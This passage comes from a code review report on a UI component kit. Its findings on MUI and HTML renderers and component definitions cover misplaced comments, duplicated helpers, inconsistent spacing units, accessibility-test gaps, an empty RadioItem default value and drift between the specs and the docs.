- **[NOTE]** **[E2]** `packages/kit-mui/src/renderers.tsx:140` — the comment block "A step draws as a plain column…" sits directly above `RepeaterNode` (line 150); `StepNode` is 31 lines further down at line 181. A reader taking the comment as documentation of the function beneath it is told the wrong thing.
- **[NOTE]** **[E2]** `packages/kit-mui/src/renderers.tsx:174` — `RepeaterNode` re-implements `alertWhenError` inline (`{...(error ? { role: 'alert' } : {})}`) and uses `{error ?? ''}` instead of `message()`, and `CheckboxNode`/`SwitchNode` (lines 283-284, 541-542) re-implement `requiredProps` and the `aria-invalid` spread inline. Four copies of two three-line helpers defined at lines 104-119 of the same file, which is how one of them drifts.

## packages/kit-mui/src/definitions.ts
- **[MEDIUM]** **[E4]** `packages/kit-mui/src/definitions.ts:50` — the same property name, in the same properties panel, with the same `number` editor, means two different units: `gap` defaults to `2` (an MUI spacing multiple, 16px) on `Screen` (50), `Stack` (63), `Step` (245) and `Repeater` (267), and to `16` (pixels) on `Grid` (209). - **[LOW]** **[E3]** `packages/kit-mui/src/definitions.ts:465` — `RadioGroup` declares `container: true`, which excludes it from all three of the kit contract's accessibility checks even though it is a real control users answer. Evidence: `test/kit-contract.test.tsx:272-274` filters with `def.dataBound && !def.container`, so the "marks a failing control invalid", "marks a required control required" and "leaves an unrequired control unmarked" tests never see it. - **[LOW]** **[E4]** `packages/kit-mui/src/definitions.ts:497` — `RadioItem`'s `defaultProps` set `value: ''`, and an empty string is what core counts as no answer. Evidence: `packages/core/src/json.ts:158-160` — `isEmpty` returns `true` for `''` — and `renderers.tsx:583` submits whatever `optionValue` returns, which for a `RadioItem` value not in `options` is the submitted string itself (`json.ts:57`). Failure scenario: an author drops a required `RadioGroup`, adds `RadioItem` children and forgets to fill in `value`; picking an option stores `''`, `required` still fails, and the field shows "This field is required." next to a visibly selected radio.
- **[NOTE]** **[E4]** `packages/kit-mui/src/definitions.ts:169` — `Select.placeholder` is declared here but is absent from the `Select` row of `docs/spec/03-components.md:145`, and nothing checks the drift: `test/docs.test.ts:446` parses only the component name and Built/Planned status out of the catalogue tables, never the properties column.
- **[NOTE]** **[E2]** `packages/kit-mui/src/definitions.ts:540` — the `maxSize` hint says "Files larger than this are refused as they are chosen", which contradicts `docs/spec/03-components.md:110` ("`maxSize` is advisory until a host enforces it"). The kit is right and the spec is stale, but a reader has no way to know which.

## Area 5 — the dependency-free HTML kit

## packages/kit-html/src/renderers.tsx

- **[MEDIUM]** **[E4]** `packages/kit-html/src/renderers.tsx:633-643` — `RadioGroupNode` puts `aria-invalid` and `aria-required` on a `<fieldset>`, whose implicit role is `group`, not `radiogroup`, so both attributes are inert — the exact mistake the comment 500 lines earlier (lines 130-139) says it is avoiding.
